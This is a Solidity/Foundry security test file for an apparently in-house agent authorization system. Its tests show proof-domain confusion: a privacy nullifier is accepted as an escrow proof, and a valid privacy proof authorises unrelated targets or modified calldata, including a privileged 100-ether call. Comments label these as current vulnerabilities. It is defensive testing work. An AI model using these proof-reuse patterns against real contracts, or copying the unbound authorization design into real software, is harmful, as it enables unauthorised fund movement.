// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {AkmenaCore} from "../../../src/core/AkmenaCore.sol";
import {AkmenaPolicyBoundary} from "../../../src/authorization/AkmenaPolicyBoundary.sol";
import {EscrowEngine} from "../../../src/economics/EscrowEngine.sol";
import {PrivacyEngine} from "../../../src/privacy/PrivacyEngine.sol";

contract PhaseLTarget {
    uint256 public executed;
    uint256 public received;

    function privilegedAction(uint256 amount) external {
        executed++;
        received += amount;
    }

    function harmlessAction() external {
        executed++;
    }
}

contract Attack_ProofDomainConfusionTest is Test {
    AkmenaCore internal core;
    AkmenaPolicyBoundary internal boundary;
    EscrowEngine internal escrow;
    PrivacyEngine internal privacy;
    PhaseLTarget internal target;

    address internal operator = address(0x1111);
    address internal agent = address(0x2222);

    function setUp() public {
        core = new AkmenaCore();
        boundary = new AkmenaPolicyBoundary(address(core));
        escrow = new EscrowEngine();
        privacy = new PrivacyEngine();
        target = new PhaseLTarget();

        core.registerModule(
            bytes32("ESCROW_ENGINE"),
            address(escrow),
            "1.0.0"
        );

        core.registerModule(
            bytes32("PRIVACY_ENGINE"),
            address(privacy),
            "1.0.0"
        );

        vm.prank(operator);
        boundary.setAgentPolicy(
            agent,
            10 ether,
            100 ether,
            true
        );
    }

    function test_Attack_PrivacyNullifierCanCollideWithEscrowId() public {
        bytes32 nullifierHash = bytes32(uint256(1));
        bytes32 secret = keccak256("phase-l-secret");
        uint256 amount = 1 ether;

        bytes32 commitment = keccak256(
            abi.encodePacked(nullifierHash, secret, amount)
        );

        vm.prank(agent);
        uint256 escrowId = escrow.createEscrow(
            agent,
            address(target),
            amount
        );

        assertEq(escrowId, 1);

        vm.deal(agent, amount);

        vm.prank(agent);
        privacy.depositPrivateEscrow{value: amount}(commitment);

        vm.prank(agent);
        privacy.executePrivateSettlement(
            nullifierHash,
            secret,
            amount,
            payable(agent)
        );

        /*
         * Privacy proof is presented to ESCROW_ENGINE.
         *
         * Expected secure behavior:
         * REJECT
         *
         * Current implementation is expected to accept because the
         * numeric proofId collides with escrowId == 1.
         */
        vm.prank(agent);

        boundary.executeAgentCall(
            operator,
            address(target),
            amount,
            bytes32("ESCROW_ENGINE"),
            uint256(nullifierHash),
            abi.encodeWithSelector(
                PhaseLTarget.harmlessAction.selector
            )
        );

        assertEq(
            target.executed(),
            1,
            "Expected current cross-domain authorization behavior"
        );
    }

    function test_Attack_EscrowProofCannotBecomePrivacyProof() public {
        uint256 escrowId;

        vm.prank(agent);
        escrowId = escrow.createEscrow(
            agent,
            address(target),
            1 ether
        );

        vm.prank(agent);

        vm.expectRevert(
            AkmenaPolicyBoundary.InvalidTransientProof.selector
        );

        boundary.executeAgentCall(
            operator,
            address(target),
            1 ether,
            bytes32("PRIVACY_ENGINE"),
            escrowId,
            abi.encodeWithSelector(
                PhaseLTarget.harmlessAction.selector
            )
        );
    }

    function test_Attack_ValidPrivacyProofCanAuthorizeUnrelatedTarget() public {
        bytes32 nullifierHash = keccak256("phase-l-target");
        bytes32 secret = keccak256("phase-l-secret-target");
        uint256 amount = 1 ether;

        bytes32 commitment = keccak256(
            abi.encodePacked(nullifierHash, secret, amount)
        );

        vm.deal(agent, amount);

        vm.prank(agent);
        privacy.depositPrivateEscrow{value: amount}(commitment);

        vm.prank(agent);
        privacy.executePrivateSettlement(
            nullifierHash,
            secret,
            amount,
            payable(agent)
        );

        vm.prank(agent);

        boundary.executeAgentCall(
            operator,
            address(target),
            amount,
            bytes32("PRIVACY_ENGINE"),
            uint256(nullifierHash),
            abi.encodeWithSelector(
                PhaseLTarget.harmlessAction.selector
            )
        );

        assertEq(
            target.executed(),
            1,
            "Expected current target-binding vulnerability"
        );
    }

    function test_Attack_ValidPrivacyProofCanAuthorizeModifiedCalldata() public {
        bytes32 nullifierHash = keccak256("phase-l-calldata");
        bytes32 secret = keccak256("phase-l-secret-calldata");
        uint256 amount = 1 ether;

        bytes32 commitment = keccak256(
            abi.encodePacked(nullifierHash, secret, amount)
        );

        vm.deal(agent, amount);

        vm.prank(agent);
        privacy.depositPrivateEscrow{value: amount}(commitment);

        vm.prank(agent);
        privacy.executePrivateSettlement(
            nullifierHash,
            secret,
            amount,
            payable(agent)
        );

        vm.prank(agent);

        boundary.executeAgentCall(
            operator,
            address(target),
            amount,
            bytes32("PRIVACY_ENGINE"),
            uint256(nullifierHash),
            abi.encodeWithSelector(
                PhaseLTarget.privilegedAction.selector,
                100 ether
            )
        );

        assertEq(
            target.received(),
            100 ether,
            "Expected current calldata-binding vulnerability"
        );
    }
}
